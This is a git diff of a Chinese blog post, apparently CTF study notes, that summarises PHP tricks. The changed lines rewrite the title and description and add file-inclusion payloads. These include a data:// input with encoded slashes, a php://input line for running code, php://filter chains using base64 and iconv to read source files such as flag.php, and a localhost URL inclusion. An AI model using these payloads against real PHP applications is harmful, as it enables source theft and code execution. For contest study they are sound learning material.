@@ -1,8 +1,8 @@
 ---
-title: CTF中的PHP知识点
+title: CTF中比赛中PHP相关的知识点
 date: 2022-12-29 21:46:39
-keywords: ctf
-description:  
+keywords: ctf php, ctf php知识点
+description: 总结 CTF 比赛中可能遇到的 PHP 相关的知识点，本文只做关键信息的总结，具体内容可以依据关键信息在互联网搜索操作步骤。 
 ---
 
 ## 一些函数的绕开
@@ -33,6 +33,9 @@ if( isset($text) && (file_get_contents($filename,'r')==="hello ctf")){
 ```php
 data://text/plain,hello ctf
 data://text/plain;base64,aGVsbG8gY3Rm
+
+/ 可以使用 &#47;
+data:&#47;&#47;text&#47;plain,4
 ```
 
 ### php 伪协议
@@ -41,7 +44,20 @@ data://text/plain;base64,aGVsbG8gY3Rm
 
 
 ```sh
+# 用于执行代码
+?file=php://input
+# 用户获取源码
 ?file=php://filter/read=convert.base64-encode/resource=flag.php
+?file=php://filter/convert.iconv.UTF-8.UTF-7/resource=index.php
+
+?file=php://filter/convert.iconv.UCS-4*.UCS-4BE/resource=check.php
+?file=php://filter/convert.iconv.EUC-JP%2a.UCS-4*/resource=flag.php
+```
+
+### 使用网络路径
+
+```sh
+?file=http://localhost:8081/phpinfo.php?.txt
 ```
 
 
